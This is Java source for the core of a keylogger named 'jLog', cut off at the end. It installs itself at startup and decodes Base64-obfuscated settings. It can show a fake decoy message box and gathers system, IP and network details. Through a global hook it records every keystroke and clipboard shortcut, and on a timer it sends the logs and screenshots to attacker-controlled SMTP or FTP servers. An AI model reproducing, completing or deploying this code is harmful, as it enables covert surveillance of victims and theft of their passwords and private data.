package com.Nimex;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Calendar;
import java.util.HashSet;
import java.util.Properties;
import java.util.Random;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;
import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.imageio.ImageIO;
import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.JOptionPane;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeInputEvent;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import com.sun.jna.Native;
import com.sun.jna.PointerType;
import com.sun.jna.platform.win32.WinDef.HWND;
import com.sun.jna.win32.StdCallLibrary;

import oshi.SystemInfo;
import oshi.hardware.Baseboard;
import oshi.hardware.ComputerSystem;
import oshi.hardware.Firmware;
import oshi.hardware.GlobalMemory;
import oshi.hardware.HardwareAbstractionLayer;
import oshi.hardware.NetworkIF;
import oshi.hardware.Sensors;
import oshi.software.os.FileSystem;
import oshi.software.os.OSFileStore;
import oshi.software.os.OperatingSystem;
import oshi.util.FormatUtil;
import startuplib.Startup;

public class Core implements Runnable, NativeKeyListener
{
	private static String OS = System.getProperty("os.name").toLowerCase();
	static int setup;
	static ArrayList<String> list = new ArrayList<String>();
    static String Mail, Pass, Reciever, SMTP, PORT, SSL, hostname, username, password, IP, delivery;
    static boolean screenshot;
    static String msg, title, icon, FullLog, currentWindow;
    		
    Capslock setGet = new Capslock();
	static Set<Integer> AlphabetSet = new HashSet<Integer>();
	static Set<Integer> NumbericSet = new HashSet<Integer>();
	static Set<Integer> SpecialCharSet = new HashSet<Integer>();
	static Set<Integer> NumPadSet = new HashSet<Integer>();
	static Set<Integer> PlayKeys = new HashSet<Integer>();
	
    // Mutex
    @SuppressWarnings("resource")
	public static boolean Mutex()
    {
    	try 
        {
            @SuppressWarnings("unused")
			ServerSocket SERVER_SOCKET = new ServerSocket(9999);
            return true;
        } 
        catch (IOException x) 
        {
        	return false;
        }
    }
    
    // Initialize new Thread
    public static void main(String[] args) throws FileNotFoundException
	{	
		boolean answer = Mutex();		
		if (answer) {}
		else { System.exit(2); }
		
		try
		{
			InputStream fis = new FileInputStream("res");
		    InputStreamReader isr = new InputStreamReader(fis, Charset.forName("UTF-8"));
		    BufferedReader br = new BufferedReader(isr);
		    
		    String line;
		    while ((line = br.readLine()) != null) 
		    {
		        list.add(line);
		    }
		    br.close();
		}
		catch (IOException er) {JOptionPane.showMessageDialog(null, er.toString());}
		new Thread(new Core()).start(); 
	}

	// AES Decoder
	public static class AES
	{
		public static String decode(String value)
		 {
			try
			{
				byte[] decodedValue = Base64.getDecoder().decode(value);
				return new String(decodedValue, StandardCharsets.UTF_8);
			}
			catch (Exception er)
			{
				System.out.println(er.toString());
				return "";
			}
		 }
	}

	// Main Core
	@Override
	public void run()
	{
		try 
		{			
			Install();
			String algorithm = AES.decode(list.get(30).replace("ALGO=", ""));
			if (algorithm.equals(AES.decode("QUVT"))) // AES
			{
				String str = AES.decode(list.get(0).replace(AES.decode("c2V0dXA9"), ""));
				if (str.equals("SMTP"))
				{
					delivery = "SMTP";
					Mail = AES.decode(list.get(1).replace(AES.decode("bWFpbD0="), ""));
					Pass = AES.decode(list.get(2).replace(AES.decode("cGFzcz0="), ""));
					Reciever = AES.decode(list.get(3).replace(AES.decode("cmVjaWV2ZXI9"), ""));
					SMTP = AES.decode(list.get(4).replace(AES.decode("U01UUD0="), ""));
					PORT = list.get(5).replace(AES.decode("cG9ydD0="), "");
					SSL = AES.decode(list.get(6).replace(AES.decode("U1NMPQ=="), ""));
					screenshot = Boolean.valueOf(list.get(6).replace(AES.decode("U0NSRUVOTE9H"), ""));	
					
					msg = AES.decode(list.get(25).replace("MSG=", ""));
					title = AES.decode(list.get(26).replace("TITLE=", ""));
					icon = AES.decode(list.get(27).replace("ICON=", ""));
					if (!msg.equals("") || !title.equals("") || !icon.equals(""))
					{
						MessageboxPopup(title, msg, icon);	
					}	
					
				}
				else if (str == "FTP")
				{
					delivery = "FTP";
				    hostname = AES.decode(list.get(7).replace(AES.decode("aG9zdG5hbWU9"), ""));
				    username = AES.decode(list.get(8).replace(AES.decode("VXNlcm5hbWU9"), ""));
				    password = AES.decode(list.get(9).replace(AES.decode("UGFzc3dvcmQ9"), ""));	    
				    screenshot = Boolean.valueOf(list.get(6).replace(AES.decode("U0NSRUVOTE9H"), ""));
				    
				    msg = AES.decode(list.get(25).replace("MSG=", ""));
					title = AES.decode(list.get(26).replace("TITLE=", ""));
					icon = AES.decode(list.get(27).replace("ICON=", ""));
					if (!msg.equals("") || !title.equals("") || !icon.equals(""))
					{
						MessageboxPopup(title, msg, icon);	
					}	
				}
			}
			
			// System Information Logger
			SystemInfo si = new SystemInfo();
	        HardwareAbstractionLayer HardWare = si.getHardware();
	        OperatingSystem os = si.getOperatingSystem();
	        
			StringBuilder content = new StringBuilder();
			content.append(addColor("<h2>" + AES.decode("W0xvZyBnZW5lcmF0ZWQgYnkgakxvZyAtIE5pbWV4IFJldm9sdXRpb25zXQ==") + "</h2>" + '\n' + '\n' + "<br />" + "<br />"));
			content.append(addColor(AES.decode("PT09PT09PT09PXwgU3lzdGVtIERldGFpbHMgfD09PT09PT09PT0=") + '\n' + '\n' + "<br />" + "<br />"));	
			content.append(AES.decode("Q29tcHV0ZXIgTmFtZTog") + GetComputerName() + '\n' + "<br />");		
			content.append("Username: " + System.getProperty("user.name") + "\n" + "<br />");
			content.append("Country Name: " + GetCountry() + "\n" + "<br />");
			content.append("System date and time: " + GetTime() + "\n" + "<br />");
			content.append("Processor: " + HardWare.getProcessor().getName() + " |" + GrabTemperatureOfCPU(HardWare.getSensors()) + "<br />");
			content.append("  - " + HardWare.getProcessor().getPhysicalProcessorCount() + " physical CPU(s)"+ "\n" + "<br />");
			content.append("  - " + HardWare.getProcessor().getLogicalProcessorCount() + " logical CPU(s)" + "\n" + "<br />");
			content.append("Memory: " + GrabMemory(HardWare.getMemory()) + "\n" + "<br />");
			content.append("Java version: " + System.getProperty("java.version") + "\n" + "<br />");
			content.append("Operating System: " + si.getOperatingSystem() + 
					" | " + GetOSArchitecture() + "\n" + "<br />" + "<br />");		
			if (list.get(11).replace(AES.decode("SVBMT0c9"), "") == "true")
			{
				content.append(AES.decode("SVAgQWRkcmVzczog") + GetIP() + "\n\n" + "<br />" + "<br />");
			}

			//
			content.append(addColor("\n" + AES.decode("PT09PT09PT09PXwgTW90aGVyYm9hcmQgRGV0YWlscyB8PT09PT09PT09PQ==") + "\n" + '\n' + "<br />" + "<br />"));
			content.append(GrabComputerSpecs(HardWare.getComputerSystem()) + "\n");
			//
			
			//
			content.append(addColor("\n" + AES.decode("PT09PT09PT09PXwgSGFyZGRyaXZlIERldGFpbHMgfD09PT09PT09PT0=") + '\n' + "<br />" + "<br />"));
			content.append(GrabHardDrives(os.getFileSystem()));			
			//
			
			//
			content.append(addColor("<br />" + AES.decode("PT09PT09PT09PXwgTmV0d29yayBEZXRhaWxzIHw9PT09PT09PT09") + '\n' + "<br />" + "<br />"));
			content.append(GrabNetworkInformation(HardWare.getNetworkIFs()));
			//
						
			String str = AES.decode(list.get(0).replace(AES.decode("c2V0dXA9"), ""));
			if (str.equals("SMTP"))
			{
				//FirstLog_SMTP(content.toString(), screenshot);	
			}
            else
			{
				//FirstLog_FTP(hostname, username, password, content.toString(), screenshot);
			}	
			
			// Start logging
			Timer timer = new Timer();
	        timer.schedule(new TimerTask() 
	        {
	            @Override
	            public void run() 
	            {
	                Tick_Tick();
	            }
	        }, 0, Long.valueOf(list.get(10).replace("INTERVAL=", "")));
	        currentWindow = GetActiveWindow();
	        KeyUp();
		} 
		catch (Exception er) 
		{
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
		    PrintStream ps = new PrintStream(baos);
		    er.printStackTrace(ps);
		    ps.close();
		    System.out.println(baos.toString());
		}
	
	}
	
	// Startup
	public static void Install()
	{
		try {
			Startup.add("Hello World", "C:\\Users\\Allan Ridha\\Desktop");
		} 
		catch (Exception e) 
		{
			System.out.print(e.toString());
		}
	}
	
	// System Information
	public static String GetIP()
	{
		String ip = "";
		try
		{
			URL url = new URL(AES.decode("aHR0cDovL2ljYW5oYXppcC5jb20v"));
		    BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));

		    String s = null;
		    while ((s = reader.readLine()) != null)
		    {
		    	ip = s;
		    }
		    reader.close();
		}
		catch (Exception e) 
		{
			ip = "-";	
		}	
		return ip;
	}
	public static String GetCountry()
	{
		try
		{
			URL url = new URL("http://freegeoip.net/json/" + GetIP());
		    BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
		    
		    String country = "";
		    String[] s = new String[1];	    
		    s[0] = reader.readLine();
		    
		    String[] parts = s[0].split(",");
		    for (String var : parts)
		    {
		    	if (var.contains("country_name"))
		    	{
		    		var = var.replace("\"", "");
		    		var = var.replace("country_name:", "");		    		
		    		country = var;
		    	}
		    }
		    reader.close();
		    return country;
		}
		catch (Exception e) 
		{
			return "Unknown";
		}
	}
	public static String GetTime()
	{
		try
		{
			SimpleDateFormat time_formatter = new SimpleDateFormat("yyyy/MM/dd - HH:mm:ss");
			String current_time_str = time_formatter.format(System.currentTimeMillis());
			return current_time_str;
		}
		catch (Exception er)
		{
			return "Unknown";
		}
	}
	public static String GetComputerName() throws UnknownHostException
	{
		try
		{
			InetAddress addr;
			addr = InetAddress.getLocalHost();
			String hostname = addr.getHostName();
			return hostname;
		}
		catch (Exception er)
		{
			return "Unknown";
		}
	}
    public static String GetOSArchitecture()
    {
    	try
    	{
    		String Architecture = System.getenv("PROCESSOR_ARCHITECTURE");
        	String Arch = System.getenv("PROCESSOR_ARCHITEW6432");

        	String result = Architecture.endsWith("64") || Arch != null && Arch.endsWith("64")
        	                      ? "x64" : "x32";
        	return result;      	
    	}
    	catch (Exception er)
    	{
    		return "Unknown";
    	}
    }
    private static String GrabComputerSpecs(final ComputerSystem computerSystem) 
    {
    	StringBuilder sb = new StringBuilder();
    	try
    	{
    		sb.append("Manufacturer: " + computerSystem.getManufacturer() + "\n" + "<br />");
            sb.append("Model: " + computerSystem.getModel() + "\n" + "<br />" + "<br />");
            final Firmware firmware = computerSystem.getFirmware();
            sb.append("\n" + "<b>&#183&#183&#183 Firmware &#183&#183&#183</b>" + "<br />" + "\n" + "<br />");
            sb.append("  Manufacturer: " + firmware.getManufacturer() + "\n" + "<br />");
            sb.append("  Name: " + firmware.getName() + "\n" + "<br />");
            sb.append("  Description: " + firmware.getDescription() + "\n" + "<br />");
            sb.append("  Version: " + firmware.getVersion() + "\n" + "<br />");
            sb.append("  Release date: " + (firmware.getReleaseDate() == null ? "unknown"
                    : firmware.getReleaseDate() == null ? "unknown" : FormatUtil.formatDate(firmware.getReleaseDate())) + "\n" + "<br />" + "<br />");
            final Baseboard baseboard = computerSystem.getBaseboard();
            sb.append("\n" + "<b>&#183&#183&#183 Baseboard &#183&#183&#183</b>" + "<br />" + "\n" + "<br />");
            sb.append("  Manufacturer: " + baseboard.getManufacturer() + "\n" + "<br />");
            sb.append("  Model: " + baseboard.getModel() + "\n" + "<br />");
            sb.append("  Version: " + baseboard.getVersion() + "\n" + "<br />");
            sb.append("  Serialnumber: " + baseboard.getSerialNumber() + "<br />" + "<br />");
    	}
    	catch (Exception er)
    	{
    		// null
    	}
        return sb.toString();
    }
    private static String GrabMemory(GlobalMemory memory) 
    {
    	StringBuilder sb = new StringBuilder();
    	try
    	{
    		sb.append("" + FormatUtil.formatBytes(memory.getAvailable()) + "/"
                    + FormatUtil.formatBytes(memory.getTotal()));
        	sb.append(" | Swap used: " + FormatUtil.formatBytes(memory.getSwapUsed()) + "/"
                    + FormatUtil.formatBytes(memory.getSwapTotal()));
    	}
    	catch (Exception er) {}
    	return sb.toString();
    }
    private static String GrabTemperatureOfCPU(Sensors sensors) 
    {
        return String.format(" CPU Temperature: %.1f°C%n", sensors.getCpuTemperature());
    }
    private static String GrabHardDrives(FileSystem fileSystem) 
    {
    	StringBuilder sb = new StringBuilder();
    	try
    	{
    		OSFileStore[] fsArray = fileSystem.getFileStores();
            for (OSFileStore fs : fsArray) {
                long usable = fs.getUsableSpace();
                long total = fs.getTotalSpace();
                sb.append(String.format(" %s [%s] %s of %s free (%.1f%%)%s%n", fs.getName(),
                        fs.getType(),
                        FormatUtil.formatBytes(usable), FormatUtil.formatBytes(fs.getTotalSpace()), 100d * usable / total,
                        "", "") + "<br />");
            }
    	}
    	catch (Exception er) {}
        return sb.toString();
    }
    private static String GrabNetworkInformation(NetworkIF[] networkIFs) 
    {	
    	StringBuilder sb = new StringBuilder();
    	try
    	{
    		sb.append('\n');
            for (NetworkIF net : networkIFs) 
            {
                sb.append(String.format(" Name: %s (%s)%n", net.getName(), net.getDisplayName()) + "<br />");
                if (net.getIPv4addr() == null)
                {
                	sb.append(String.format("   IPv4: [-]") + "<br />");
                }
                else
                {
                	sb.append(String.format("   IPv4: %s %n", Arrays.toString(net.getIPv4addr())) + "<br />");
                }
                if (net.getIPv6addr() == null)
                {
                	sb.append(String.format("   IPv6: [-]") + "<br />");
                }
                else
                {
                	sb.append(String.format("   IPv6: %s %n", Arrays.toString(net.getIPv6addr())) + "<br />"); 
                }
                sb.append('\n' + "<br />");
            }       
    	}
    	catch (Exception er) {}
        return sb.toString();
    }
    //
  
    // First Log - SMTP
    static Properties MailProperties;
	static Session MailSession;
	static MimeMessage genMailMessage;
	static String text;
	public static String addColor(String msg) 
	{
	    String hexColora = "d55151";
	    String colorMsg = "<FONT COLOR=\"#" + hexColora + "\">" + msg + "</FONT>";
	    return colorMsg;
	}
    static void FirstLog_SMTP(String content, boolean screenshot)
    {
    	try
		{
			// Properties
		    MailProperties = System.getProperties();
		    MailProperties.put("mail.smtp.port", PORT);
		    MailProperties.put("mail.smtp.auth", true);
		    MailProperties.put("mail.smtp.starttls.enable", SSL);
			
		    // Session
		    MailSession = Session.getDefaultInstance(MailProperties);
		    genMailMessage = new MimeMessage(MailSession);
		    genMailMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(Reciever));
		    genMailMessage.setFrom(Mail);
		    genMailMessage.setSubject("jLog - System Details.html", "utf-8");
		    genMailMessage.setContent(content, "text/html"); 
		    
		    // Send Mail
		    Transport Send = MailSession.getTransport("smtp");
		    Send.connect(SMTP, Mail, Pass);
		    Send.sendMessage(genMailMessage, genMailMessage.getAllRecipients());
		    Send.close();	    
		}
		catch (Exception er) {}
    }
    //
    
    // First Log - FTP
    public void FirstLog_FTP(String host, String user, String pass, String content, boolean screenshot)
	{
		FTPClient ftp = new FTPClient();
		FileInputStream sis = null;
		String filename = System.getProperty("java.io.tmpdir") + Randomize() + ".txt";
		String scr_dir = System.getProperty("java.io.tmpdir") + Randomize() + ".bmp";
		
		try
		{			
			ftp.connect(host);
			ftp.login(user, pass);	
			ftp.setFileType(FTP.BINARY_FILE_TYPE);
			
			PrintWriter ofd = new PrintWriter(filename, "UTF-8");
			
			ofd.write(content);
			ofd.close();
			
			sis = new FileInputStream(filename);	
			String dir = "/PC: " + GetComputerName();
			boolean str = ftp.makeDirectory(dir);		
			if (str)
			{
				ftp.storeFile(dir + "/" + "jLog - System Details.html", sis);
			}
			else
			{
				return;
			}
			if (screenshot)
			{
				Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
				BufferedImage capture = new Robot().createScreenCapture(screenRect);
				ImageIO.write(capture, "png", new File(scr_dir));
					
				FileInputStream scr = new FileInputStream(scr_dir);
				ftp.storeFile(dir + "/" + "Screenshot.png", scr);
				scr.close();
				
				Files.delete(Paths.get(scr_dir));
			}
			ftp.logout();
		} 
		catch (IOException | AWTException er) {}
		finally 
		{
			try
			{
				if (sis != null)
				{
					sis.close();
				}
				ftp.disconnect();
				Files.deleteIfExists(Paths.get(filename));
				Files.deleteIfExists(Paths.get(scr_dir));
			}
			catch (IOException er) {}
		}
	}
    public static char Randomize() 
    {
    	Random r = new Random();
    	char c = (char) (r.nextInt(26) + 'a');
		return c;
    }
   
    // Fake Messagebox
    static void MessageboxPopup(String title, String message, String icon)
    {	
		if (icon == "Critical")
		{
			JOptionPane.showMessageDialog(null, message, title, JOptionPane.ERROR_MESSAGE);
		}
		else if (icon == "Information")
		{
			JOptionPane.showMessageDialog(null, message, title, JOptionPane.INFORMATION_MESSAGE);
		}
		else if (icon == "Warning")
		{
			JOptionPane.showMessageDialog(null, message, title, JOptionPane.WARNING_MESSAGE);
		}
		else
		{
			JOptionPane.showMessageDialog(null, message, title, JOptionPane.NO_OPTION);
		}
    }
    //
    
    // Standard Log - SMTP
    public static void StandardLog_SMTP(boolean screenshot)
    {
    	if (!FullLog.isEmpty())
    	{
    		try
    		{
    		    MailProperties = System.getProperties();
    		    MailProperties.put("mail.smtp.port", PORT);
    		    MailProperties.put("mail.smtp.auth", true);
    		    MailProperties.put("mail.smtp.starttls.enable", SSL);

    		    MailSession = Session.getDefaultInstance(MailProperties);
    		    genMailMessage = new MimeMessage(MailSession);
    		    genMailMessage.addRecipient(Message.RecipientType.TO, new InternetAddress(Reciever));
    		    genMailMessage.setFrom(Mail);
    		    genMailMessage.setSubject("jLog - You got Logs - PC: " + GetComputerName(), "utf-8");
    		    if (FullLog != "")
    		    {
    		    	genMailMessage.setContent(FullLog, "text/html"); 
    		    }
    		    else
    		    {
    		    	return;
    		    }
    		    
    		    Transport Send = MailSession.getTransport("smtp");
    		    Send.connect(SMTP, Mail, Pass);
    		    Send.sendMessage(genMailMessage, genMailMessage.getAllRecipients());
    		    Send.close();	 
    		    FullLog = "";
    		    currentWindow = "";
    		}
    		catch (Exception er) {}
    	}
    }
    
    // Standard Log - FTP
    public static void StandardLog_FTP(String host, String user, String pass, boolean screenshot)
	{
    	if (FullLog.isEmpty())
    	{
		FTPClient ftp = new FTPClient();
		FileInputStream sis = null;
		String filename = System.getProperty("java.io.tmpdir") + Randomize() + ".txt";
		String scr_dir = System.getProperty("java.io.tmpdir") + Randomize() + ".bmp";
		
		try
		{			
			ftp.connect(host);
			ftp.login(user, pass);	
			ftp.setFileType(FTP.BINARY_FILE_TYPE);
			
			PrintWriter ofd = new PrintWriter(filename, "UTF-8");
			
			if ((FullLog != ""))
			{
				ofd.write(FullLog);
				ofd.close();
			}
			else
			{
				ofd.close();
				return;
			}
			
			sis = new FileInputStream(filename);	
			String dir = "/PC: " + GetComputerName();
			boolean str = ftp.makeDirectory(dir);		
			if (str)
			{
				ftp.storeFile(dir + "/" + "jLog - You got Logs - PC: " + GetComputerName() + ".html", sis);
			}
			else
			{
				return;
			}
			if (screenshot)
			{
				Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
				BufferedImage capture = new Robot().createScreenCapture(screenRect);
				ImageIO.write(capture, "png", new File(scr_dir));
					
				FileInputStream scr = new FileInputStream(scr_dir);
				ftp.storeFile(dir + "/" + "Screenshot_" + Randomize() + ".png", scr);
				scr.close();
				
				Files.delete(Paths.get(scr_dir));
			}
			ftp.logout();
			FullLog = "";
		    currentWindow = "";
		} 
		catch (IOException | AWTException er) {}
		finally 
		{
			try
			{
				if (sis != null)
				{
					sis.close();
				}
				ftp.disconnect();
				Files.deleteIfExists(Paths.get(filename));
				Files.deleteIfExists(Paths.get(scr_dir));
			}
			catch (IOException er) {}
		}
    	}
	}

    
    //Keylog Sequence
    static void Tick_Tick()
    {
    	if (!(FullLog.equals("")))
    	{
    		if (delivery == "SMTP")
    		{
    			new Thread()
    			{
    			    @Override
					public void run() 
    			    {
    			        StandardLog_SMTP(screenshot);			     
    			    }
    			}.start(); 			
    		}
    		else
    		{
    			new Thread()
    			{
    			    @Override
					public void run() 
    			    {
    			    	StandardLog_FTP(hostname, username, password, screenshot);
    			    }
    			}.start();
    		}
    	}
    	else
    	{
    		return;
    	}
    }
    
    // Keyhook
    public void KeyUp()
    {
    	SetAlphabetValues();
		SetNumericValues();
		SetSpecialCharacters();
		SetNumPadCharacters();
		setPlayKeys();
		
		try
		{
			GlobalScreen.registerNativeHook();
		}
		catch (Throwable er) {}
		try
		{
			GlobalScreen.addNativeKeyListener(this);
			Handler[] handlers = Logger.getLogger("").getHandlers();
			for (int i = 0; i < handlers.length; i++) 
			{
			    handlers[i].setLevel(Level.OFF);
			}
			Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
			logger.setLevel(Level.OFF);
		}
		catch (Exception er) {}
    }
    static void SetAlphabetValues()
	{
		// A-Z + CAPS LOCK
		AlphabetSet.add(30); // A
		AlphabetSet.add(48);
		AlphabetSet.add(46);
		AlphabetSet.add(32);
		AlphabetSet.add(18);
		AlphabetSet.add(33);
		AlphabetSet.add(34);
		AlphabetSet.add(35);	
		AlphabetSet.add(23);
		AlphabetSet.add(36);
		AlphabetSet.add(37);
		AlphabetSet.add(38);
		AlphabetSet.add(50);	
		AlphabetSet.add(49);
		AlphabetSet.add(24);
		AlphabetSet.add(19);
		AlphabetSet.add(25);
		AlphabetSet.add(16);
		AlphabetSet.add(31);
		AlphabetSet.add(20);
		AlphabetSet.add(22);
		AlphabetSet.add(47);
		AlphabetSet.add(45);
		AlphabetSet.add(17);
		AlphabetSet.add(21);
		AlphabetSet.add(44); // Z
		AlphabetSet.add(58); // Caps
	}
	static void SetNumericValues()
	{
		for (int i = 2; i < 12; i++)
		{
			NumbericSet.add(i);
		}
	}
    static void SetSpecialCharacters()
    {
    	SpecialCharSet.add(43);
    	SpecialCharSet.add(1); 	
    	SpecialCharSet.add(57);
    	SpecialCharSet.add(14);	
    	SpecialCharSet.add(42);
    	SpecialCharSet.add(54);	
    	SpecialCharSet.add(29);
    	SpecialCharSet.add(3613); 	
    	SpecialCharSet.add(28);
    	SpecialCharSet.add(3675);   	
    	SpecialCharSet.add(56);  	
    	SpecialCharSet.add(51);
    	SpecialCharSet.add(52);
    	SpecialCharSet.add(12);	
    	SpecialCharSet.add(53);
    	SpecialCharSet.add(39);
    	SpecialCharSet.add(26);   	
    	SpecialCharSet.add(13);
    	SpecialCharSet.add(27);	
    	SpecialCharSet.add(40); 
    	SpecialCharSet.add(41);  
    	
    	SpecialCharSet.add(3639); 
    	SpecialCharSet.add(70); 
    	SpecialCharSet.add(3653); 
    	SpecialCharSet.add(3666);
    	SpecialCharSet.add(3663); 
    	SpecialCharSet.add(3665); 
    	SpecialCharSet.add(3657);
    	SpecialCharSet.add(3655);
    	SpecialCharSet.add(57377); 
    	SpecialCharSet.add(3667); 
    }
    static void SetNumPadCharacters()
    {
    	NumPadSet.add(82); // 0
    	NumPadSet.add(79); // 1 
    	NumPadSet.add(80); // 2
    	NumPadSet.add(81); // 3
    	NumPadSet.add(75); // 4
    	NumPadSet.add(76); // 5
    	NumPadSet.add(77); // 6
    	NumPadSet.add(71); // 7
    	NumPadSet.add(72); // 8
    	NumPadSet.add(73); // 9
    	NumPadSet.add(83); // ,
    	NumPadSet.add(28); // [ENTER]
    	NumPadSet.add(78); // +
    	NumPadSet.add(74); // -
    	NumPadSet.add(55); // * 
    	NumPadSet.add(3637); // /
    	NumPadSet.add(69); // Caps lock
    }
    static void setPlayKeys()
    {
    	PlayKeys.add(57416);
    	PlayKeys.add(57421);
    	PlayKeys.add(57424);
    	PlayKeys.add(57419);
    }
    static Boolean ShiftCtrlAltPlusKeys(NativeKeyEvent e)
	{		
		boolean isShiftPressed = (e.getModifiers() & NativeInputEvent.SHIFT_MASK) > 0;
		boolean isCtrlPressed = (e.getModifiers() & NativeInputEvent.CTRL_MASK) > 0;
		
		if (e.getKeyCode() == 46 && isCtrlPressed)
		{
			FullLog += ("[COPY - CTRL+C]");
			return true;
		}
		if (e.getKeyCode() == 30 && isCtrlPressed)
		{
			FullLog += ("[SELECT_ALL - CTRL+A]");
			return true;
		}	
		if (e.getKeyCode() == 47 && isCtrlPressed)
		{
			FullLog += ("[PASTE - CTRL+V]");
			return true;
		}
		if (e.getKeyCode() == 33 && isCtrlPressed)
		{
			FullLog += ("[FIND - CTRL+F]");
			return true;
		}
		if (e.getKeyCode() == 17 && isCtrlPressed)
		{
			FullLog += ("[CUT - CTRL+X]");
			return true;
		}	
		if (e.getKeyCode() == 2 && isShiftPressed)
		{
			FullLog += ("!");
			return true;
		}
		else if (e.getKeyCode() == 3 && isShiftPressed)
		{
			char quote = '@';
			FullLog += (quote);
			return true;
		}			
		else if (e.getKeyCode() == 4 && isShiftPressed)
		{
			FullLog += ("#");
			return true;
		}
		else if (e.getKeyCode() == 5 && isShiftPressed)
		{
			FullLog += ("$");
			return true;
		}
		else if (e.getKeyCode() == 6 && isShiftPressed)
		{
			FullLog += ("%");
			return true;
		}
		else if (e.getKeyCode() == 7 && isShiftPressed)
		{
			FullLog += ("^");
			return true;
		}
		else if (e.getKeyCode() == 8 && isShiftPressed)
		{
			FullLog += ("&");
			return true;
		}
		else if (e.getKeyCode() == 9 && isShiftPressed)
		{
			FullLog += ("*");
			return true;
		}
		else if (e.getKeyCode() == 10 && isShiftPressed)
		{
			FullLog += ("(");
			return true;
		}
		else if (e.getKeyCode() == 11 && isShiftPressed)
		{
			FullLog += (")");
			return true;
		}
		else if (e.getKeyCode() == 43 && isShiftPressed)
		{
			FullLog += ("|");
			return true;
		}
		else if (e.getKeyCode() == 12 && isShiftPressed)
		{
			FullLog += ("_");
			return true;
		}
		else if (e.getKeyCode() == 13 && isShiftPressed)
		{
			FullLog += ("+");
			return true;
		}
		else if (e.getKeyCode() == 40 && isShiftPressed)
		{
			char quote = '"';
			FullLog += (quote);
			return true;
		}
		else if (e.getKeyCode() == 39 && isShiftPressed)
		{
			FullLog += (":");
			return true;
		}
		else if (e.getKeyCode() == 51 && isShiftPressed)
		{
			FullLog += ("<");
			return true;
		}
		else if (e.getKeyCode() == 52 && isShiftPressed)
		{
			FullLog += (">");
			return true;
		}
		else if (e.getKeyCode() == 53 && isShiftPressed)
		{
			FullLog += ("?");
			return true;
		}
		else if (e.getKeyCode() == 53 && isShiftPressed)
		{
			FullLog += ("?");
			return true;
		}
		else if (e.getKeyCode() == 26 && isShiftPressed)
		{
			FullLog += ("{");
			return true;
		}
		else if (e.getKeyCode() == 27 && isShiftPressed)
		{
			FullLog += ("}");
			return true;
		}	
		else if (e.getKeyCode() == 41 && isShiftPressed)
		{
			FullLog += ("~");
			return true;
		}	
		
		// Alphabet
		else if (e.getKeyCode() == 30 & isShiftPressed)
		{
			FullLog += ("A");
			return true;
		}	
		else if (e.getKeyCode() == 48 & isShiftPressed)
		{
			FullLog += ("B");
			return true;
		}
		else if (e.getKeyCode() == 46 & isShiftPressed)
		{
			FullLog += ("C");
			return true;
		}
		else if (e.getKeyCode() == 32 & isShiftPressed)
		{
			FullLog += ("D");
			return true;
		}
		else if (e.getKeyCode() == 18 & isShiftPressed)
		{
			FullLog += ("E");
			return true;
		}
		else if (e.getKeyCode() == 33 & isShiftPressed)
		{
			FullLog += ("F");
			return true;
		}	
		else if (e.getKeyCode() == 34 & isShiftPressed)
		{
			FullLog += ("G");
			return true;
		}
		else if (e.getKeyCode() == 35 & isShiftPressed)
		{
			FullLog += ("H");
			return true;
		}
		else if (e.getKeyCode() == 23 & isShiftPressed)
		{
			FullLog += ("I");
			return true;
		}
		else if (e.getKeyCode() == 36 & isShiftPressed)
		{
			FullLog += ("J");
			return true;
		}
		else if (e.getKeyCode() == 37 & isShiftPressed)
		{
			FullLog += ("K");
			return true;
		}
		else if (e.getKeyCode() == 38 & isShiftPressed)
		{
			FullLog += ("L");
			return true;
		}
		else if (e.getKeyCode() == 50 & isShiftPressed)
		{
			FullLog += ("M");
			return true;
		}
		else if (e.getKeyCode() == 49 & isShiftPressed)
		{
			FullLog += ("N");
			return true;
		}
		else if (e.getKeyCode() == 24 & isShiftPressed)
		{
			FullLog += ("O");
			return true;
		}
		else if (e.getKeyCode() == 19 & isShiftPressed)
		{
			FullLog += ("P");
			return true;
		}
		else if (e.getKeyCode() == 25 & isShiftPressed)
		{
			FullLog += ("Q");
			return true;
		}
		else if (e.getKeyCode() == 16 & isShiftPressed)
		{
			FullLog += ("R");
			return true;
		}
		else if (e.getKeyCode() == 31 & isShiftPressed)
		{
			FullLog += ("S");
			return true;
		}
		else if (e.getKeyCode() == 20 & isShiftPressed)
		{
			FullLog += ("T");
			return true;
		}
		else if (e.getKeyCode() == 22 & isShiftPressed)
		{
			FullLog += ("U");
			return true;
		}
		else if (e.getKeyCode() == 47 & isShiftPressed)
		{
			FullLog += ("V");
			return true;
		}
		else if (e.getKeyCode() == 45 & isShiftPressed)
		{
			FullLog += ("W");
			return true;
		}
		else if (e.getKeyCode() == 17 & isShiftPressed)
		{
			FullLog += ("X");
			return true;
		}
		else if (e.getKeyCode() == 21 & isShiftPressed)
		{
			FullLog += ("Y");
			return true;
		}
		else if (e.getKeyCode() == 44 & isShiftPressed)
		{
			FullLog += ("Z");
			return true;
		}
		//
		else
		{
			return false;
		}
	}
	@Override
